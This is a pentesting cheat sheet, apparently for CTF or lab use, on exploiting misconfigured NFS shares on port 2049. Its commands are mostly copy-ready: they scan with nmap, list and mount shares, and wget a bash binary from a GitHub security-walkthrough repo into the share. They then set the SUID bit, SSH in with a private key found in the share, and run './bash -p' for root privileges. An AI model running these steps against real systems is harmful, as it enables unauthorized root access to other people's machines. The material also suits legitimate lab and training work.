# NFS / Port 2049
NFS stands for "Network File System" and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

## Workflow
1. Port scan with nmap
2. Enumerate accessible shares
3. Create a mount point
4. Mount the NFS share to the mount point
5. [Download](https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash) or make a bash executable (The file must be owned by root)
6. Add the SUID bit and execution permission to the bash executable
7. SSH into the remote host (if SSH private key is found in the share)
8. Run the executable on the remote host

## Advance preparation
```
export rhost=[RHOST IP]
```

## Port scan
Check if port 2049 is open
```
sudo nmap -sS -sV -O $rhost
```

## Enumeration (with NFS-Common)
### NFS-Common
NFS-Common includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs.

### Listing NFS Shares
```
showmount -e $rhost  
```

## Exploitation
### Create a mount point
```
mkdir /tmp/mount
```

### Mounting NFS shares
```
sudo mount -t nfs ${rhost}:[SHARE] /tmp/mount -nolock
```

- -t : Type of device to mount
- ${rhost} : The IP Address of the NFS server
- SHARE	: The name of a share in the remote host
- /tmp/mount: The local directory to mount a share to
- -nolock	: Specifies not to use NLM locking

### Download or make a bash executable
```
sudo wget https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash?raw=true -O /tmp/mount/bash
```

### Add the SUID bit and execution permission
```
cd /tmp/mount && sudo chmod +xs bash
```

### SSH into the remote host
```
ssh -i [PRIVATE KEY] [USERNAME]@${rhost}
```

### Run the bash executable (with p persisting permission)
```
./bash -p
```
